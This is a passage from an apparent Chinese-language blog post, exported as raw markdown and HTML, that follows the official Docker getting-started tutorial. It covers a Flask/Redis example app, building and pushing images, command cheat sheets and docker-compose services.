requirements.txt\n\n# Make port 80 available to the world outside this container\nEXPOSE 80\n\n# Define environment variable\nENV NAME World\n\n# Run app.py when the container launches\nCMD [\"python\", \"app.py\"]\n```\n### `requirements.txt`\n``` bash\nFlask\nRedis\n```\n\n### `app.py`\n``` python\nfrom flask import Flask\nfrom redis import Redis, RedisError\nimport os\nimport socket\n\n# Connect to Redis\nredis = Redis(host=\"redis\", db=0, socket_connect_timeout=2, socket_timeout=2)\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef hello():\n    try:\n        visits = redis.incr(\"counter\")\n    except RedisError:\n        visits = \"<i>cannot connect to Redis, counter disabled</i>\"\n\n    html = \"<h3>Hello {name}!</h3>\" \\\n           \"<b>Hostname:</b> {hostname}<br/>\" \\\n           \"<b>Visits:</b> {visits}\"\n    return html.format(name=os.getenv(\"NAME\", \"world\"), hostname=socket.gethostname(), visits=visits)\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=80)\n```\n\n**使用命令创建一个Docker镜像**\n``` bash\n$ docker build -t friendlyhello .\n$ docker images\n\nREPOSITORY            TAG                 IMAGE ID\nfriendlyhello         latest              326387cea398\n```\n\n## Run the app\n**运行应用程序，使用-p将您的机器的端口4000映射到容器的已发布端口80：**\n``` bash\n$ docker run -p 4000:80 friendlyhello\n```\n**你应该看到一条消息，Python在`http://0.0.0.0:80`上提供你的应用程序。但是，这个消息来自容器内部，它不知道你将该容器的端口80映射到4000，所以正确的URL为`http://localhost:4000`。**\n**在Web浏览器中转到该URL以查看网页上显示的显示内容，包括“Hello World”文本，容器标识和Redis错误消息。**\n![](https://docs.docker.com/get-started/images/app-in-browser.png)\n\n**现在让我们以分离模式在后台运行应用程序：**\n``` bash\n$ docker run -d -p 4000:80 friendlyhello\n```\n\n**你得到你的应用程序的长容器ID，然后被踢回你的终端。您的容器正在后台运行。您还可以使用`docker container ls`查看缩略容器标识**\n``` bash\n$ docker container ls\nCONTAINER ID        IMAGE               COMMAND             CREATED\n1fa4ab2cf395        friendlyhello       \"python app.py\"     28 seconds ago\n```\n\n**现在使用`docker container stop`来结束进程，使用CONTAINER ID，如下所示：**\n``` bash\ndocker container stop 1fa4ab2cf395\n```\n\n## Share your image\n**为了演示我们刚刚创建的容器的可移植性，我们上传我们构建的映像，并在其他地方运行它。毕竟，当你想将容器部署到生产环境时，你需要学习如何`push`到一个公共地方。**\n**如果你还没有Docker帐号，需要在[这里](https://cloud.docker.com/)注册一个帐号**\n**本地登录你的Docker库**\n``` bash\n$ docker login\n```\n\n**关联本地镜像像与注册表(registry)中存储库的符号是`username/repository:tag`。该标签是可选的，但推荐使用，因为这是注册管理机构管理Docker镜像版本的机制。给存储库标记有意义的名字，比如`get-started:part2`。这会将镜像放入`get-started`存储库中，并将其标记为`part2`。**\n**现在，把它们放在一起来标记镜像。使用您的用户名，存储库和标签名称运行`docker tag image`，以便将镜像上传到您想要的目的地。该命令的语法是:**\n``` bash\n$ docker tag image username/repository:tag\n```\n**For example:**\n``` bash\n$ docker tag friendlyhello john/get-started:part2\n```\n**查看你新标记的镜像**\n``` bash\n$ docker images\nREPOSITORY               TAG                 IMAGE ID            CREATED             SIZE\nfriendlyhello            latest              d9e555c53008        3 minutes ago       195MB\njohn/get-started         part2               d9e555c53008        3 minutes ago       195MB\npython                   2.7-slim            1c7128a655f6        5 days ago          183MB\n...\n```\n\n**发布镜像**\n``` bash\n$ docker push username/repository:tag\n```\n\n**拉取并运行远端库**\n``` bash\ndocker run -p 4000:80 username/repository:tag\n```\n### 速查表\n``` bash\ndocker build -t friendlyname .# 使用此目录的 Dockerfile 创建镜像\ndocker run -p 4000:80 friendlyname  # 运行端口 4000 到 90 的“友好名称”映射\ndocker run -d -p 4000:80 friendlyname         # 内容相同，但在分离模式下\ndocker ps                                 # 查看所有正在运行的容器的列表\ndocker stop <hash>                     # 平稳地停止指定的容器\ndocker ps -a           # 查看所有容器的列表，甚至包含未运行的容器\ndocker kill <hash>                   # 强制关闭指定的容器\ndocker rm <hash>              # 从此机器中删除指定的容器\ndocker rm $(docker ps -a -q)           # 从此机器中删除所有容器\ndocker images -a                               # 显示此机器上的所有镜像\ndocker rmi <imagename>            # 从此机器中删除指定的镜像\ndocker rmi $(docker images -q)             # 从此机器中删除所有镜像\ndocker login             # 使用您的 Docker 凭证登录此 CLI 会话\ndocker tag <image> username/repository:tag  # 标记 <image> 以上传到镜像库\ndocker push username/repository:tag            # 将已标记的镜像上传到镜像库\ndocker run username/repository:tag                   # 运行镜像库中的镜像\n```\n\n\n## 服务\n\n### 了解服务\n**在分布式应用中，应用的不同部分称为“服务”。例如，假设有一个视频共享网站，它可能提供用于在数据库中存储应用程序数据的服务、用于在用户上传一些内容后在后台进行视频转码的服务、用于前端的服务等。**\n\n**服务实际上是“生产中的容器”。一项服务仅运行一个镜像，但它会编制镜像的运行方式 - 它应使用的端口、容器的多少个从节点应运行才能使服务的容量满足其需求等。扩展服务将更改运行该软件的容器实例数，并将多个计算资源分配给进程中的服务。**\n\n**幸运的是，很容易使用 Docker 平台定义、运行和扩展服务 – 只需编写一个`docker-compose.yml`文件即可。**\n\n### `docker-compose.yml`\n``` bash\nversion:\"3\"\nservices:\n  web:\n    # 将 username/repo:tag 替换为您的名称和镜像详细信息\n    image: username/repository:tag\n    deploy:\n      replicas:5\n      resources:\n        limits:\n          cpus:\"0.1\"\n          memory:50M\n      restart_policy:\n        condition: on-failure\n    ports:\n      - \"80:80\"\n    networks:\n      - webnet\nnetworks:\n  webnet:\n```\n\n**此 docker-compose.yml 文件会告诉 Docker 执行以下操作：**\n- 从镜像库中拉取我们上传的镜像。\n- 将该镜像的五个实例作为服务`web`运行，并将每个实例限制为最多使用 10% 的 CPU（在所有核心中）以及 50MB RAM。\n- 如果某个容器发生故障，立即重启容器。\n- 将主机上的端口 80 映射到 web 的端口 80。\n- 指示`web`容器通过负载均衡的网络`webnet`共享端口 80。（在内部，容器自身将在临时端口发布到 web 的端口 80。）\n- 使用默认设置定义`webnet`网络（此为负载均衡的`overlay`网络）。\n\n### 运行新的负载均衡(load-balanced)的应用\n**需要先运行以下命令，然后才能使用`docker stack deploy`命令：**\n``` bash\ndocker swarm init\n```\n**现在，运行此命令。您必须为应用指定一个名称。在此处该名称设置为`getstartedlab`：**\n``` bash\ndocker stack deploy -c docker-compose.yml getstartedlab\n```\n**查看您刚才启动的五个容器的列表：**\n``` bash\ndocker stack ps getstartedlab\n```\n![](/images/docker1.png)\n\n**您可以多次在一行中运行`curl http://localhost`，也可以在浏览器中转至该 URL 并多次点击“刷新”。无论采用哪种方式，您都将看到容器 ID 更改，从而说明负载均衡；借助每项请求，将以循环方式选择五个从节点之一做出响应。**\n> **注：在此阶段，容器最多可能需要 30 秒来响应 HTTP 请求。这并不代表 Docker 或 swarm 的性能，而是一项未满足的 Redis 依赖关系，我们稍后将在本教程中讨论此依赖关系。**\n\n### 扩展应用\n**您可以通过在`docker-compose.yml`中更改`replicas`值，保存更改并重新运行`docker stack deploy`命令来扩展应用：**\n``` bash\ndocker stack deploy -c docker-compose.yml getstartedlab\n```\n**Docker 将执行原地更新，而无需先清除技术栈或终止任何容器。**\n**现在，重新运行`docker stack ps`命令以查看经过重新配置的已部署实例。例如，如果您扩展了从节点，将有更多处于运行状态的容器。**\n\n### 清除应用和 swarm\n**使用`docker stack rm`清除应用：**\n``` bash\ndocker stack rm getstartedlab\n```\n**这将删除应用，但我们的单节点`swarm`仍处于正常运行状态（如`docker node ls`所示）。使用`docker swarm leave --force`清除 swarm。**\n\n### 速查表\n``` bash\ndocker stack ls              # 列出此 Docker 主机上所有正在运行的应用\ndocker stack deploy -c <composefile> <appname>  # 运行指定的 Compose 文件\ndocker stack services <appname>       # 列出与应用关联的服务\ndocker stack ps <appname>   # 列出与应用关联的正在运行的容器\ndocker stack rm <appname>                             # 清除应用\n```\n\n## Swarm\n引用[Docker中文文档 Swarm](https://docs.docker-cn.com/get-started/part4/)\n\n## 技术栈\n引用[Docker中文文档 技术栈](https://docs.docker-cn.com/get-started/part5/)\n\n## 引用链接\n- [Docker中文](https://www.docker-cn.com/what-docker)\n- [Get Docker CE for CentOS](https://docs.docker.com/engine/installation/linux/docker-ce/centos/)\n- [Docker官网文档](https://docs.docker.com/get-started/)\n- [Docker 服务](https://docs.docker-cn.com/get-started/part3/)","slug":"docker","published":1,"updated":"2017-11-28T08:23:26.486Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscyj001lyp0la64mlkva","content":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p><strong>Docker 是世界领先的软件容器平台。开发人员利用 Docker 可以消除协作编码”在我的机器上可正常工作”的问题。运维人员利用 Docker 可以在隔离容器中并行运行和管理应用，获得更好的计算密度。企业利用 Docker 可以构建敏捷的软件交付管道，以更快的速度、更高的安全性和可靠的信誉为 Linux 和 Windows Server 应用发布新功能。</strong><br><strong><a href=\"https://www.docker-cn.com/what-docker\" target=\"_blank\" rel=\"external\">更加全面的介绍</a></strong><br><a id=\"more\"></a></p>\n<h2 id=\"容器\"><a href=\"#容器\" class=\"headerlink\" title=\"容器\"></a>容器</h2><p><strong><code>image</code>是一个轻量级的，独立的可执行程序包，包含运行一个软件所需的所有东西，包括代码，运行时库，环境变量和配置文件。</strong><br><strong><code>container</code>是<code>image</code>的运行时实例 —- <code>image</code>在实际执行时在内存中变成的内容。默认情况下，它与主机环境完全隔离，只有在配置时才访问主机文件和端口。</strong><br><strong>容器(containers)在主机的内核上本地运行应用程序。它们比只能通过管理程序虚拟访问主机资源的虚拟机具有更好的性能特征。容器可以获得本地访问权限，每个容器都以独立的进程运行，不会花费比其他可执行文件更多的内存。</strong></p>\n<h2 id=\"虚拟机-vs-容器\"><a href=\"#虚拟机-vs-容器\" class=\"headerlink\" title=\"虚拟机 vs. 容器\"></a>虚拟机 vs. 容器</h2><h3 id=\"虚拟机架构\"><a href=\"#虚拟机架构\" class=\"headerlink\" title=\"虚拟机架构\"></a>虚拟机架构</h3><p><img src=\"https://www.docker.com/sites/default/files/VM%402x.png\" alt=\"\"><br><strong>虚拟机运行客户操作系统 —- 每个框中的操作系统层。这是资源密集型的，产生的磁盘映像和应用程序状态是操作系统设置。系统安装的依赖关系，操作系统安全补丁和其他易于丢失的东西，难以复制重用</strong></p>\n<h3 id=\"容器架构\"><a href=\"#容器架构\" class=\"headerlink\" title=\"容器架构\"></a>容器架构</h3><p><img src=\"https://www.docker.com/sites/default/files/Container%402x.png\" alt=\"\"><br><strong>容器可以共享一个内核，并且唯一需要在容器镜像中的信息是可执行文件及其包依赖关系(the only information that needs to be in a container image is the executable and its package dependencies)，它们永远不需要安装在主机系统上。这些进程像本地进程一样运行，你可以像<code>docker ps</code>一样运行命令来单独管理它们，就像在Linux上运行ps来查看活动进程一样。最后，因为它们包含了所有的依赖关系，所以没有配置纠缠。一个集装箱化的应用程序”随处运行”</strong></p>\n<h2 id=\"安装Docker\"><a href=\"#安装Docker\" class=\"headerlink\" title=\"安装Docker\"></a>安装Docker</h2><h3 id=\"卸载旧版本\"><a href=\"#卸载旧版本\" class=\"headerlink\" title=\"卸载旧版本\"></a>卸载旧版本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum remove docker \\</span><br><span class=\"line\">                  docker-common \\</span><br><span class=\"line\">                  docker-selinux \\</span><br><span class=\"line\">                  docker-engine</span><br></pre></td></tr></table></figure>\n<h3 id=\"安装Docker-CE-Community-Edition\"><a href=\"#安装Docker-CE-Community-Edition\" class=\"headerlink\" title=\"安装Docker CE(Community Edition)\"></a>安装Docker CE(Community Edition)</h3><h4 id=\"软件库安装\"><a href=\"#软件库安装\" class=\"headerlink\" title=\"软件库安装\"></a>软件库安装</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum install -y yum-utils \\</span><br><span class=\"line\">  device-mapper-persistent-data \\</span><br><span class=\"line\">  lvm2</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum-config-manager \\</span><br><span class=\"line\">    --add-repo \\</span><br><span class=\"line\">    https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum install docker-ce</span><br></pre></td></tr></table></figure>\n<h4 id=\"开启Docker\"><a href=\"#开启Docker\" class=\"headerlink\" title=\"开启Docker\"></a>开启Docker</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo systemctl start docker</span><br></pre></td></tr></table></figure>\n<h4 id=\"Hello-World\"><a href=\"#Hello-World\" class=\"headerlink\" title=\"Hello World\"></a>Hello World</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run hello-world</span><br><span class=\"line\"></span><br><span class=\"line\">Hello from Docker!</span><br><span class=\"line\">This message shows that your installation appears to be working correctly.</span><br><span class=\"line\"></span><br><span class=\"line\">To generate this message, Docker took the following steps:</span><br><span class=\"line\">...(snipped)...</span><br></pre></td></tr></table></figure>\n<h2 id=\"Building-an-app\"><a href=\"#Building-an-app\" class=\"headerlink\" title=\"Building an app\"></a>Building an app</h2><p><strong>现在是开始构建Docker方式的应用程序的时候了。我们将从这个应用程序的层次结构的底部开始，这个应用程序是一个容器。在这个层次上面是一个服务，它定义了容器在生产中的行为方式。最后，在顶层是堆栈，定义了所有服务的交互。</strong><br><strong>过去，如果你要开始编写一个Python应用程序，你的第一步就是在你的机器上安装一个Python运行库。但是，这会造成您的机器上的环境必须如此以使您的应用程序按预期运行。</strong></p>\n<p><strong>使用Docker，您可以将一个可移植的Python运行时作为一个镜像来获取，无需安装。然后，您的构建可以将基础Python镜像与应用程序代码一起包括在内，确保您的应用程序和依赖项一起运行。</strong><br><strong>这个可移植的镜像被定义为<code>Dockerfile</code></strong></p>\n<h3 id=\"Dockerfile\"><a href=\"#Dockerfile\" class=\"headerlink\" title=\"Dockerfile\"></a><code>Dockerfile</code></h3><p><strong>创建一个空的目录，cd进入空目录，创建一个<code>Dockerfile</code>文件,<code>requirement.txt</code>文件,<code>app.py</code>文件</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Use an official Python runtime as a parent image</span></span><br><span class=\"line\">FROM python:2.7-slim</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Set the working directory to /app</span></span><br><span class=\"line\">WORKDIR /app</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Copy the current directory contents into the container at /app</span></span><br><span class=\"line\">ADD . /app</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Install any needed packages specified in requirements.txt</span></span><br><span class=\"line\">RUN pip install --trusted-host pypi.python.org -r requirements.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Make port 80 available to the world outside this container</span></span><br><span class=\"line\">EXPOSE 80</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Define environment variable</span></span><br><span class=\"line\">ENV NAME World</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Run app.py when the container launches</span></span><br><span class=\"line\">CMD [<span class=\"string\">\"python\"</span>, <span class=\"string\">\"app.py\"</span>]</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"requirements-txt\"><a href=\"#requirements-txt\" class=\"headerlink\" title=\"requirements.txt\"></a><code>requirements.txt</code></h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flask</span><br><span class=\"line\">Redis</span><br></pre></td></tr></table></figure>\n<h3 id=\"app-py\"><a href=\"#app-py\" class=\"headerlink\" title=\"app.py\"></a><code>app.py</code></h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> redis <span class=\"keyword\">import</span> Redis, RedisError</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Connect to Redis</span></span><br><span class=\"line\">redis = Redis(host=<span class=\"string\">\"redis\"</span>, db=<span class=\"number\">0</span>, socket_connect_timeout=<span class=\"number\">2</span>, socket_timeout=<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/\")</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hello</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        visits = redis.incr(<span class=\"string\">\"counter\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> RedisError:</span><br><span class=\"line\">        visits = <span class=\"string\">\"&lt;i&gt;cannot connect to Redis, counter disabled&lt;/i&gt;\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    html = <span class=\"string\">\"&lt;h3&gt;Hello &#123;name&#125;!&lt;/h3&gt;\"</span> \\</span><br><span class=\"line\">           <span class=\"string\">\"&lt;b&gt;Hostname:&lt;/b&gt; &#123;hostname&#125;&lt;br/&gt;\"</span> \\</span><br><span class=\"line\">           <span class=\"string\">\"&lt;b&gt;Visits:&lt;/b&gt; &#123;visits&#125;\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html.format(name=os.getenv(<span class=\"string\">\"NAME\"</span>, <span class=\"string\">\"world\"</span>), hostname=socket.gethostname(), visits=visits)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>, port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n<p><strong>使用命令创建一个Docker镜像</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker build -t friendlyhello .</span><br><span class=\"line\">$ docker images</span><br><span class=\"line\"></span><br><span class=\"line\">REPOSITORY            TAG                 IMAGE ID</span><br><span class=\"line\">friendlyhello         latest              326387cea398</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Run-the-app\"><a href=\"#Run-the-app\" class=\"headerlink\" title=\"Run the app\"></a>Run the app</h2><p><strong>运行应用程序，使用-p将您的机器的端口4000映射到容器的已发布端口80：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run -p 4000:80 friendlyhello</span><br></pre></td></tr></table></figure></p>\n<p><strong>你应该看到一条消息，Python在<code>http://0.0.0.0:80</code>上提供你的应用程序。但是，这个消息来自容器内部，它不知道你将该容器的端口80映射到4000，所以正确的URL为<code>http://localhost:4000</code>。</strong><br><strong>在Web浏览器中转到该URL以查看网页上显示的显示内容，包括“Hello World”文本，容器标识和Redis错误消息。</strong><br><img src=\"https://docs.docker.com/get-started/images/app-in-browser.png\" alt=\"\"></p>\n<p><strong>现在让我们以分离模式在后台运行应用程序：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run <span class=\"_\">-d</span> -p 4000:80 friendlyhello</span><br></pre></td></tr></table></figure></p>\n<p><strong>你得到你的应用程序的长容器ID，然后被踢回你的终端。您的容器正在后台运行。您还可以使用<code>docker container ls</code>查看缩略容器标识</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker container ls</span><br><span class=\"line\">CONTAINER ID        IMAGE               COMMAND             CREATED</span><br><span class=\"line\">1fa4ab2cf395        friendlyhello       <span class=\"string\">\"python app.py\"</span>     28 seconds ago</span><br></pre></td></tr></table></figure></p>\n<p><strong>现在使用<code>docker container stop</code>来结束进程，使用CONTAINER ID，如下所示：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker container stop 1fa4ab2cf395</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Share-your-image\"><a href=\"#Share-your-image\" class=\"headerlink\" title=\"Share your image\"></a>Share your image</h2><p><strong>为了演示我们刚刚创建的容器的可移植性，我们上传我们构建的映像，并在其他地方运行它。毕竟，当你想将容器部署到生产环境时，你需要学习如何<code>push</code>到一个公共地方。</strong><br><strong>如果你还没有Docker帐号，需要在<a href=\"https://cloud.docker.com/\" target=\"_blank\" rel=\"external\">这里</a>注册一个帐号</strong><br><strong>本地登录你的Docker库</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker login</span><br></pre></td></tr></table></figure></p>\n<p><strong>关联本地镜像像与注册表(registry)中存储库的符号是<code>username/repository:tag</code>。该标签是可选的，但推荐使用，因为这是注册管理机构管理Docker镜像版本的机制。给存储库标记有意义的名字，比如<code>get-started:part2</code>。这会将镜像放入<code>get-started</code>存储库中，并将其标记为<code>part2</code>。</strong><br><strong>现在，把它们放在一起来标记镜像。使用您的用户名，存储库和标签名称运行<code>docker tag image</code>，以便将镜像上传到您想要的目的地。该命令的语法是:</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker tag image username/repository:tag</span><br></pre></td></tr></table></figure></p>\n<p><strong>For example:</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker tag friendlyhello john/get-started:part2</span><br></pre></td></tr></table></figure></p>\n<p><strong>查看你新标记的镜像</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker images</span><br><span class=\"line\">REPOSITORY               TAG                 IMAGE ID            CREATED             SIZE</span><br><span class=\"line\">friendlyhello            latest              d9e555c53008        3 minutes ago       195MB</span><br><span class=\"line\">john/get-started         part2               d9e555c53008        3 minutes ago       195MB</span><br><span class=\"line\">python                   2.7-slim            1c7128a655f6        5 days ago          183MB</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure></p>\n<p><strong>发布镜像</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker push username/repository:tag</span><br></pre></td></tr></table></figure></p>\n<p><strong>拉取并运行远端库</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -p 4000:80 username/repository:tag</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"速查表\"><a href=\"#速查表\" class=\"headerlink\" title=\"速查表\"></a>速查表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker build -t friendlyname .<span class=\"comment\"># 使用此目录的 Dockerfile 创建镜像</span></span><br><span class=\"line\">docker run -p 4000:80 friendlyname  <span class=\"comment\"># 运行端口 4000 到 90 的“友好名称”映射</span></span><br><span class=\"line\">docker run <span class=\"_\">-d</span> -p 4000:80 friendlyname         <span class=\"comment\"># 内容相同，但在分离模式下</span></span><br><span class=\"line\">docker ps                                 <span class=\"comment\"># 查看所有正在运行的容器的列表</span></span><br><span class=\"line\">docker stop &lt;<span class=\"built_in\">hash</span>&gt;                     <span class=\"comment\"># 平稳地停止指定的容器</span></span><br><span class=\"line\">docker ps <span class=\"_\">-a</span>           <span class=\"comment\"># 查看所有容器的列表，甚至包含未运行的容器</span></span><br><span class=\"line\">docker <span class=\"built_in\">kill</span> &lt;<span class=\"built_in\">hash</span>&gt;                   <span class=\"comment\"># 强制关闭指定的容器</span></span><br><span class=\"line\">docker rm &lt;<span class=\"built_in\">hash</span>&gt;              <span class=\"comment\"># 从此机器中删除指定的容器</span></span><br><span class=\"line\">docker rm $(docker ps <span class=\"_\">-a</span> -q)           <span class=\"comment\"># 从此机器中删除所有容器</span></span><br><span class=\"line\">docker images <span class=\"_\">-a</span>                               <span class=\"comment\"># 显示此机器上的所有镜像</span></span><br><span class=\"line\">docker rmi &lt;imagename&gt;            <span class=\"comment\"># 从此机器中删除指定的镜像</span></span><br><span class=\"line\">docker rmi $(docker images -q)             <span class=\"comment\"># 从此机器中删除所有镜像</span></span><br><span class=\"line\">docker login             <span class=\"comment\"># 使用您的 Docker 凭证登录此 CLI 会话</span></span><br><span class=\"line\">docker tag &lt;image&gt; username/repository:tag  <span class=\"comment\"># 标记 &lt;image&gt; 以上传到镜像库</span></span><br><span class=\"line\">docker push username/repository:tag            <span class=\"comment\"># 将已标记的镜像上传到镜像库</span></span><br><span class=\"line\">docker run username/repository:tag                   <span class=\"comment\"># 运行镜像库中的镜像</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"服务\"><a href=\"#服务\" class=\"headerlink\" title=\"服务\"></a>服务</h2><h3 id=\"了解服务\"><a href=\"#了解服务\" class=\"headerlink\" title=\"了解服务\"></a>了解服务</h3><p><strong>在分布式应用中，应用的不同部分称为“服务”。例如，假设有一个视频共享网站，它可能提供用于在数据库中存储应用程序数据的服务、用于在用户上传一些内容后在后台进行视频转码的服务、用于前端的服务等。</strong></p>\n<p><strong>服务实际上是“生产中的容器”。一项服务仅运行一个镜像，但它会编制镜像的运行方式 - 它应使用的端口、容器的多少个从节点应运行才能使服务的容量满足其需求等。扩展服务将更改运行该软件的容器实例数，并将多个计算资源分配给进程中的服务。</strong></p>\n<p><strong>幸运的是，很容易使用 Docker 平台定义、运行和扩展服务 – 只需编写一个<code>docker-compose.yml</code>文件即可。</strong></p>\n<h3 id=\"docker-compose-yml\"><a href=\"#docker-compose-yml\" class=\"headerlink\" title=\"docker-compose.yml\"></a><code>docker-compose.yml</code></h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 